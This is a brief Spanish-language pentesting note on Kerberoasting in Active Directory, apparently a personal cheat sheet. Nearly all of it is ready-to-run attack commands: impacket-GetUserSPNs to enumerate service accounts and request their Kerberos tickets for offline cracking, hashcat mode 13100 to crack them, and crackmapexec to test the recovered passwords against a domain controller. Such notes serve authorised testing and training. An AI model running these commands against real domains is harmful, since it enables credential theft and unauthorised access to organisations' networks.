Para esto podemos usar el módulo de impacket.

Debemos utilizarlo contra un DC y necesitamos tener credenciales de un usuario (en texto plano o en NTLM), una shell en contexto de un usuario de dominio o una cuenta de system.

Listar los usuarios con SPN

    sudo impacket-GetUserSPNs -dc-ip <dc_ip> <dominio>/<user>

Pedir tickets para todos los usuarios:

    sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user>:'pass' -request -outputfile <file_de_guardado>

Pedir tickets para un usuario puntual:

    sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user> -request-user <user_victima> -outputfile <file_de_guardado>  (es importante generar el export así luego podemos crackear el archivo)


Una vez tenemos el hash podemos crackearlo con hashcat 13100

y luego podemos probar conectarnos:

    sudo crackmapexec smb <dc_ip> -u <user> -p <pass>

